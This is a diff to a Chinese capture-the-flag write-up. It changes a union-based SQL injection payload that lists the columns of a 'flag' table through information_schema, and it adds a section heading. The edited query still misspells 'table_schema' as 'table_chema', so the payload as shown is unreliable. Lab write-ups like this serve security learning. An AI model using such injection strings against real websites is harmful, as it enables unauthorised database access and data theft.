@@ -815,7 +815,7 @@ Database: yucctf
 
 接下来就看看flag表里有什么字段，因为他看起来比user和username更加可能存在flag
 
-命令`?id=2' and 1=2 union select 1,column_name,3 from information_schema.columns where tabels_chema='message' and table_name='flag' limit 0,1 -- dawd`
+命令`?id=2' and 1=2 union select 1,column_name,3 from information_schema.columns where table_chema='message' and table_name='flag' limit 0,1 -- dawd`
 
 ![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200837920.webp)
 
@@ -835,5 +835,5 @@ flag里的东西解密后就是chen所以答案是
 
 `flag{chen}`
 
-
+## 攻防世界:
 
